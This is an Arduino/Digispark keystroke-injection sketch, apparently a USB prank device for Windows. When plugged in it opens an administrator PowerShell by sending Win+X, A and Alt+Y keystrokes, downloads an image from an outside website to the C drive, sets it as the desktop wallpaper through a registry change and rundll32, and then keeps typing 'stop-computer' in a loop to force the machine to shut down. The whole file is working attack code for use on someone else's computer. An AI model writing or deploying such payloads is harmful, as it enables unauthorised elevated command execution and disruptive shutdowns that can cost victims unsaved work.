#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
  
  
  
  
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(700);

  // Here's the pic file btw
  DigiKeyboard.print("Invoke-WebRequest -Uri \"http://nationalpurebreddogday.com/wp-content/uploads/2016/10/773012715dae2cfa52f5e13145b358f1.jpg\" -OutFile \"C:\\photo.png\"");
  DigiKeyboard.delay(100);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1250);
 
  DigiKeyboard.print("Function Set-WallPaper($Value)");
  DigiKeyboard.print("\n {\n  Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value $value; \n rundll32.exe user32.dll, UpdatePerUserSystemParameters; \n }");
  DigiKeyboard.delay(900);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  SetPhotoToDesktop();


}


void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.print("stop-computer\n");
  
}

void SetPhotoToDesktop()
{

  DigiKeyboard.delay(500);

  DigiKeyboard.print("Set-WallPaper -value \"C:\\photo.png\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}
